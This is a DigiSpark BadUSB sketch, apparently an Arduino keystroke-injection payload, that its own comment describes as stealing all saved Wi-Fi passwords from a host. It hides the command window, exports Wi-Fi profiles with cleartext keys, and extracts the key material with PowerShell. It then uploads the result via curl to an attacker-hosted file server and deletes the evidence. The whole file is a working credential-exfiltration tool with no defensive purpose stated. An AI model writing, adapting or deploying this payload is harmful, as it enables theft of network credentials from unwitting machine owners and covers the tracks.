/*
Steals all known Wi-Fi passwords that is stored in the host. It will upload to a fileserver that we host.
Be sure to host an UPLOAD-CAPABLE file server.
*/
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(2500);
    
    /* Wi-FI Stealer */
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(750);
    DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_M);
    for(int i =0; i < 100; i++)
        {
        DigiKeyboard.sendKeyStroke(81);
        }
    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Detach from scrolling
    DigiKeyboard.delay(750);
    DigiKeyboard.println("cd %temp%"); // Temporary directory
    DigiKeyboard.delay(750);
    DigiKeyboard.println("netsh wlan export profile key=clear"); // Grab all the saved WiFi passwords and saving in temperory directory
    DigiKeyboard.delay(750);
    DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
    DigiKeyboard.delay(750);
    DigiKeyboard.println("curl -X POST [FILESERVER]/upload -F files=@Wi-Fi-PASS"); // Upload passwords file to server
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("del Wi-* /s /f /q"); // Clean up
    DigiKeyboard.delay(750);
    DigiKeyboard.println("exit");
    DigiKeyboard.delay(750);

    for (;;) {
        /*Stops the digispark from running the scipt again*/
    }
}